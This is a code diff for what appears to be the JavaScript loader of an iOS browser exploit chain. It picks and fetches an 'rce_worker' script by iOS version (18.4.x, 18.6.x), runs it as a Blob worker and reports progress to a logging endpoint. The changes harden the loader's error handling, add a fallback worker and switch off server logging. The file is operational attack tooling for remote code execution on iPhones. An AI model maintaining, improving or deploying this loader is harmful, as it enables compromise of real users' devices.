@@ -1,4 +1,4 @@
-var SERVER_LOG = true;
+var SERVER_LOG = false;
 let logStart = new Date().getTime();
 let logEntryID = 0;
 var offsets = {};
@@ -11,22 +11,23 @@ var localHost = location.origin + basePrefix;
 function print(x, reportError = false, dumphex = false) {
     let out = ('[' + (new Date().getTime() - logStart) + 'ms] ').padEnd(10) + x;
     console.log(out);
-    try { window.parent.postMessage({ type: 'lightsaber_log', text: out }, location.origin); } catch(e) {}
     if (!SERVER_LOG && !reportError) return;
     let obj = {
         id: logEntryID++,
         text: out,
-    }
+    };
     if (dumphex) {
-        obj.hex = 1
-        obj.text = x
+        obj.hex = 1;
+        obj.text = x;
     }
-    let req = Object.entries(obj).map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`).join('&')
+    let req = Object.entries(obj).map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`).join('&');
     try {
         const xhr = new XMLHttpRequest();
-        xhr.open("GET", localHost + "/log?" + req , false);
+        xhr.open("GET", localHost + "/log?" + req, false);
         xhr.send(null);
-    } catch(e) { console.error("log send failed:", e); }
+    } catch (e) {
+        console.error("log send failed:", e);
+    }
 }
 function redirect()
 {
@@ -37,17 +38,21 @@ function getJS(fname,method = 'GET')
 {
     try
     {
-        url = fname;
+        let url = fname;
         print("getJS: fetching " + url);
         let xhr = new XMLHttpRequest();
-        xhr.open("GET", `${url}` , false);
+        xhr.open(method, `${url}` , false);
         xhr.send(null);
-        print("getJS: got " + xhr.status + " (" + xhr.responseText.length + " bytes)");
+        if (xhr.status < 200 || xhr.status >= 300) {
+            throw new Error("HTTP " + xhr.status + " for " + url);
+        }
+        print("getJS: got " + xhr.status + " (" + (xhr.responseText ? xhr.responseText.length : 0) + " bytes)");
         return xhr.responseText;
     }
     catch(e)
     {
         print("getJS ERROR: " + e, true);
+        return null;
     }
 }
 const signal = new Uint8Array(8);
@@ -90,9 +95,15 @@ let workerCode = "";
 if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2') {
     print("Using worker for iOS 18.6.x");
     workerCode = getJS(`rce_worker_18.6.js?${Date.now()}`); // local version
+    if (!workerCode || !workerCode.trim()) {
+        workerCode = getJS(`rce_worker.js?${Date.now()}`);
+    }
 } else {
     print("Using worker for iOS 18.4.x");
     workerCode = getJS(`rce_worker.js?${Date.now()}`); // local version
+}
+if (!workerCode || !workerCode.trim()) {
+    throw new Error("worker code load failed");
 }
 print("Worker code loaded: " + (workerCode ? workerCode.length + " bytes" : "FAILED (null/empty)"));
 let workerBlob = new Blob([workerCode],{type:'text/javascript'});
@@ -199,7 +210,7 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
             }
             case 'log':
             {
-                if (data.text) {
+                if (SERVER_LOG && data.text) {
                     try { window.parent.postMessage({ type: 'lightsaber_log', text: data.text }, location.origin); } catch(e) {}
                 }
                 break;
